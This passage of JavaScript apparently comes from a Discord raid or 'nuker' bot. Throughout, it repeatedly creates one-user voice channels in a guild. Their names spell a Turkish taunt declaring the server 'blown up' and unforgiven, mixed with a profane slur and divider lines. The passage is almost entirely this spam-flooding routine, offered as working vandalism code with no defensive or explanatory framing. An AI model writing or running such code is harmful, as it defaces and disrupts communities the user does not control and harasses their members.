      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
